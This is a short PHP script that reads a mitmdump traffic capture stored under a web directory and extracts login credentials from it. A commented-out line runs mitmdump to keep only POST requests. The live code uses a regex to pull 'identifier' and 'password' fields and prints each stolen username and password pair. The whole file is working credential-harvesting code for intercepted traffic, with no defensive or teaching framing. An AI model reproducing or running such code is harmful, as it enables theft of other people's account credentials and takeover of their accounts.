<?php

//exec("~/mitmdump -nr /var/www/html/The_Girl/tcore/mitmdump -w /var/www/html/The_Girl/tcore/filtered \"~m post\"");


$str = file_get_contents("/var/www/html/The_Girl/tcore/mitmdump");

$re = '/&identifier=(.*)&password=(.*)&/';

preg_match_all($re, $str, $matches, PREG_SET_ORDER, 0);

// Print the entire match result
foreach($matches as $match) {
    $user = $match[1];
    $pass = substr($match[2], 0, strpos($match[2], "&"));
    echo "User: $user, Pass: $pass\n";
}
?>